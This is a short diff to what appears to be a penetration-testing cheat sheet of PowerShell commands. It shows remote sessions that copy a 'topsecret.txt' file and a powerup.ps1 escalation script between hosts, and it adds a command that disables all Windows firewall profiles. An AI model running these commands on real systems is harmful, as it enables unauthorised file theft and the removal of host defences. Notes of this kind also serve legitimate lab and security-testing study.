@@ -357,3 +357,7 @@ Copy-Item -FromSession $ses -Path  C:\Users\Administrator\Desktop\topsecret.txt
 $ses = New=PsSesion -ComputerName HYDRA
 Copy-Item -ToSession $ses -Path  C:\Users\punisher\Desktop\powerup.ps1 -Destiantion C:\Users\Random\powerup.ps1
 ```
+# Disable Firewall
+```
+PS C:\Windows\system32> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
